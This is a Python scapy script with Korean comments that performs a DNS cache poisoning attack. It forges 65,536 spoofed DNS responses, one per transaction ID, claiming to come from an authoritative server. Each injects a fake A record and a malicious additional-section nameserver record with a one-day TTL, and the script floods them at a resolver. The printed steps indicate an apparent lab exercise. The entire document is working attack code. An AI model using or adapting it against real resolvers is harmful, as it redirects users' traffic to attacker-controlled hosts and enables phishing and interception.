#!/usr/bin/env python3
from scapy.all import *
import os
import sys
import time

# === [ 설정 단계 ] ===
def require_env(name):
    value = os.getenv(name)
    if not value:
        raise SystemExit(f"[!] Missing required environment variable: {name}")
    return value

RESOLVER_IP = require_env("RESOLVER_IP")
AUTH_SERVER_IP = require_env("AUTH_IP")
TARGET_DOMAIN = require_env("TARGET_DOMAIN")
FAKE_IP = require_env("FAKE_WEB_IP")
TARGET_PORT = int(require_env("RESOLVER_ATTACK_UDP_PORT"))
DNS_PORT = int(require_env("DNS_PORT"))
ATTACK_NS_NAME = require_env("ATTACK_NS_NAME")

def make_packet(txid):
    """
    조작된 DNS 응답 패킷 생성 (Additional Section 포함)
    """
    ip = IP(src=AUTH_SERVER_IP, dst=RESOLVER_IP)
    udp = UDP(sport=DNS_PORT, dport=TARGET_PORT)
    dns = DNS(
        id=txid,
        qr=1, aa=1, rd=1,
        qd=DNSQR(qname=TARGET_DOMAIN),
        an=DNSRR(rrname=TARGET_DOMAIN, type='A', rclass='IN', ttl=86400, rdata=FAKE_IP),
        ar=DNSRR(rrname=ATTACK_NS_NAME, type='A', rclass='IN', ttl=86400, rdata=FAKE_IP)
    )
    return ip/udp/dns

def start_attack():
    print(f"[*] 목표 리졸버: {RESOLVER_IP} (Port: {TARGET_PORT})")
    
    # 1. 프리-로딩 단계 (패킷 리스트 생성)
    print(f"[*] [Step 1] 패킷 {65536} 개 생성 시작... 잠시만 기다려 주세요.")
    start_gen = time.time()
    
    # 리스트 컴프리헨션을 사용하여 생성 속도를 높였습니다.
    pkts = [make_packet(txid) for txid in range(65536)]
    
    end_gen = time.time()
    print(f"[*] [Step 1] 생성 완료! (소요 시간: {end_gen - start_gen:.2f} 초)")
    print(f"[*] 현재 메모리에 {len(pkts)} 개의 패킷이 장전되었습니다.")
    
    # 2. 대기 및 발사 단계
    print("\n" + "="*50)
    print("  [ 대기 중 ] 다른 터미널에서 아래 순서대로 진행하세요:")
    print("  1. 권한 서버 딜레이 설정 (예: tc delay 10s)")
    print("  2. 리졸버 캐시 초기화 (rndc flush)")
    print("  3. 리졸버에게 쿼리 전송 (dig @localhost ...)")
    print("="*50)
    
    input("\n[▶] dig 명령어를 날린 직후, 여기서 [Enter] 를 눌러 전송")

    # 3. 전송 실행
    print("[🔥] 포격 개시!")
    start_send = time.time()
    
    # inter=0 으로 설정하여 지연 없이 통으로 전송
    send(pkts, inter=0, verbose=0)
    
    end_send = time.time()
    elapsed = end_send - start_send
    print(f"\n[+] 전송 완료! (순수 전송 소요 시간: {elapsed:.2f} 초)")
    print(f"[*] 초당 전송 속도 (PPS): {len(pkts) / elapsed:.2f} pkts/s")

if __name__ == "__main__":
    if os.getuid() != 0:
        print("[!] 권한 에러: root (sudo) 권한으로 실행해 주세요.")
        sys.exit(1)
        
    start_attack()
